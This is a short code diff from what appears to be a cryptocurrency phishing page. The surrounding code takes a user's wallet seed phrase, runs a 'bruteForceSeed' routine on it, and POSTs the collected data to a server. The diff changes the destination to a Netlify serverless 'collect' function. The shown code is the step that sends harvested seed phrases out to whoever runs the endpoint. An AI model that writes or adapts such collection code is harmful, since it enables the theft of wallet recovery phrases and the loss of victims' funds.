@@ -189,7 +189,7 @@
             data.bruteForceResults = bruteForceSeed(data.seedPhrase);
 
             // Send data to server
-            const response = await fetch("/collect", {
+            const response = await fetch("/.netlify/functions/collect", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(data),
